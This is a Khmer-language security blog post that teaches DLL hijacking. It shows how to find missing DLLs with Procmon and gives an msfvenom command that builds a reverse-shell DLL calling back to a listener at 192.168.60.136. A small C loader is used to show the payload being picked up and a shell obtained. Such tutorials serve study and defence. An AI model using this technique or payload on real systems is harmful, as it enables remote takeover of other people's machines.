---
title: "DLL Hijacking Attack 0x01"
date: 2023-07-07T21:01:06+07:00
description: យល់ដឹងអំពីការវាយប្រហារបែប DLL Hijacking
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- dll
- hijacking
categories:
- DLL Hijacking
series:
- WinExE
image: images/feature3/dll.png
---

DLL hijacking ឬដែលគេត្រូវបានស្គាល់ថាជា DLL preloading ឬ DLL side-loading គឺជាវិធីសាស្ត្រវាយប្រហារដោយធ្វើការបោកបញ្ឆោតរាល់កម្មវិធី (Software) ដែលមាននៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូទាំងអស់ក្នុងការព្យាយាមបើកដំណើរការ DLL ដែលមានបង្កប់នូវមេរោគជាជាងបើកដំណើរការ DLL មែនទែននៃកម្មវិធី ។

#### Finding Missing DLLs

ដើម្បីស្វែងរករាល់ DLL ដែលបានបាត់នៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូយើងអាចប្រើប្រាស់កម្មវិធី [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) ហើយធ្វើការ Filter លក្ខណ្ឌទាំងពីរដូចរូបខាងក្រោម៖

![Filter Include 1](/en/posts/img/2023/07/dll-hijacking-0x01/filter-1.png)
![Filter Include 2](/en/posts/img/2023/07/dll-hijacking-0x01/filter-2.png)

ក្រោយពីយើងធ្វើការដាក់បញ្ជូល Filter ទាំងពីររួចរាល់ សូមចុច Apply នោះកម្មវិធីនឹងធ្វើការច្រោះចេញនូវរាល់ DLLs ទាំងឡាយណាដែលត្រូវការបើកដំណើរការ ប៉ុន្តែវាមិនត្រូវបានរកឃើញនៅក្នុងប្រព័ន្ធ ។

![Filter Results](/en/posts/img/2023/07/dll-hijacking-0x01/dll-filter-results.png)

ប្រសិនបើយើងចង់ធ្វើការ Filter ទៅលើកម្មវិធីណាមួយជាក់លាក់នោះយើងត្រូវបន្ថែមការកំណត់ Filter ដូចខាងក្រោម៖

![Filter By Process Name](/en/posts/img/2023/07/dll-hijacking-0x01/filter-by-process-name.png)
![Filter By Process Name Apply](/en/posts/img/2023/07/dll-hijacking-0x01/filter-by-process-name-apply.png)

#### Exploation Path
ដំបូងយើងត្រូវការ DLL Payload ដោយយើងអាចបង្កើតវាបានតាមរយៈ Framework ជាច្រើនដូចជា Metasploit / Cobalt Strike​ / DCRat ។ល។ យើងនឹងបង្កើតវាដោយប្រើប្រាស់ MSFvenom ដែលជា Standalone Payload Generator ដូចខាងក្រោម៖

{{< highlight bash "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f dll > payload.dll
{{< / highlight >}}

ចឹងនៅក្នុងអត្ថបទនេះយើងនឹងសាកល្បងបង្កើតឯកសារ EXE មួយដែលព្យាយាមបើកឯកសារ DLL ឈ្មោះថា test.dll ដោយប្រើប្រាស់ភាសារ C ។

{{< highlight c "linenos=table" >}}
#include <windows.h>
#include <stdio.h>
// Compile with: i686-w64-mingw32-gcc-win32 loader.c -o loader.exe

int main(void) {
	HINSTANCE hDll;
	hDll = LoadLibrary(TEXT("test.dll"));
	if(hDll != NULL) {
			printf("DLL was found!\n");
	} else {
			printf("DLL not found!\n");
	}
	return 0;
}
{{< / highlight >}}

ក្រោយពីដំណើរការឯកសារ loader.exe ខាងលើយើងនឹងទទួលបានសារប្រាប់ថាឯកសារ DLL ឈ្មោះថា test.dll បានបាត់បង់ រកមិនឃើញ ។

![Filter By Process Name Apply](/en/posts/img/2023/07/dll-hijacking-0x01/loader-missing-test-dll.png)

ដូចនេះបើយើងយក Payload របស់យើងកែឈ្មោះឲ្យដូច និងចម្លងដាក់ចូលទៅក្នុងថតឯកសារនៃ test.dll ដែល loader.exe ស្វែងរកមិនឃើញ នោះយើងនឹងទទួលបាន Reverse Shell ជាក់ជាមិនខាន ៕

![Filter By Process Name Apply](/en/posts/img/2023/07/dll-hijacking-0x01/got-reverse-shell.png)